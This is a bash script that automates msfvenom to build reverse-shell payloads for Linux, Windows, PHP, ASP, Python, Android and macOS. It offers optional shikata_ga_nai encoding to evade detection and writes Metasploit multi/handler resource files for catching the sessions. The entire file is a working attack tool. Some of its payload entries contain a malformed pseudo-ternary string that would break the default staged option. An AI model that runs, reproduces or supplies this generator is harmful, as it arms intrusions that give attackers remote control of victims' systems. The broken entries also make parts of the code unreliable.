#!/bin/bash

set -euo pipefail

# Check for required tools
for tool in msfvenom msfconsole; do
    if ! command -v "$tool" &>/dev/null; then
        echo "[!] Required tool '$tool' not found. Please install it."
        exit 1
    fi
done

# User input
read -rp "Enter LHOST (your IP or tunnel host): " LHOST
read -rp "Enter LPORT (listening port): " LPORT

# Validate port
if ! [[ "$LPORT" =~ ^[0-9]{1,5}$ ]] || [ "$LPORT" -gt 65535 ]; then
    echo "[!] Invalid port number: $LPORT"
    exit 1
fi

# Payload type
read -rp "Use staged payloads? (yes/no): " staged
staged=${staged,,}  # Lowercase

# Obfuscation
read -rp "Use encoder (x86/shikata_ga_nai)? (yes/no): " encode
encode=${encode,,}

ENCODER=""
if [[ "$encode" == "yes" ]]; then
    ENCODER="-e x86/shikata_ga_nai -i 3"
fi

OUTPUT_DIR="./payloads"
mkdir -p "$OUTPUT_DIR"

# Payload database
declare -A PAYLOADS=(
    [1]="linux/x86/meterpreter/${staged:-yes} == yes ? reverse_tcp : reverse_tcp_rc|payload_linux.elf|elf|handler_linux.rc"
    [2]="windows/meterpreter/${staged:-yes} == yes ? reverse_tcp : reverse_tcp_rc|payload_windows.exe|exe|handler_windows.rc"
    [3]="php/meterpreter_reverse_tcp|payload_php.php|raw|handler_php.rc"
    [4]="windows/meterpreter/reverse_tcp|payload_asp.asp|asp|handler_asp.rc"
    [5]="cmd/unix/reverse_python|payload_python.py|raw|handler_python.rc"
    [6]="android/meterpreter/reverse_tcp|payload_android.apk|raw|handler_android.rc"
    [7]="osx/x64/meterpreter_reverse_tcp|payload_macos.macho|macho|handler_macos.rc"
)

# Adjust staged/stageless
if [[ "$staged" == "no" ]]; then
    PAYLOADS[1]="linux/x86/meterpreter_reverse_tcp|payload_linux.elf|elf|handler_linux.rc"
    PAYLOADS[2]="windows/meterpreter_reverse_tcp|payload_windows.exe|exe|handler_windows.rc"
fi

# Menu
echo ""
echo "[*] Select the payloads to generate:"
for i in "${!PAYLOADS[@]}"; do
    echo "$i) ${PAYLOADS[$i]%%|*}"
done
echo "8) All"
read -rp "Enter your choices (e.g. 1 2 5): " choices

# Handle 'All'
if [[ "$choices" =~ (^| )8($| ) ]]; then
    choices="${!PAYLOADS[@]}"
fi

echo ""

# Generate selected payloads
for choice in $choices; do
    entry="${PAYLOADS[$choice]:-}"
    if [[ -z "$entry" ]]; then
        echo "[!] Invalid option: $choice"
        continue
    fi

    IFS="|" read -r PAYLOAD FILE FORMAT HANDLER <<< "$entry"

    echo "[*] Generating $FILE..."
    msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" $ENCODER -f "$FORMAT" -o "$OUTPUT_DIR/$FILE" \
        && echo "[+] Payload saved to $OUTPUT_DIR/$FILE"

    cat <<EOF > "$OUTPUT_DIR/$HANDLER"
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF

    echo "[+] Handler saved to $OUTPUT_DIR/$HANDLER"
    echo ""
done

echo "[*] Done! Run a handler with:"
echo "    msfconsole -r $OUTPUT_DIR/handler_<type>.rc"
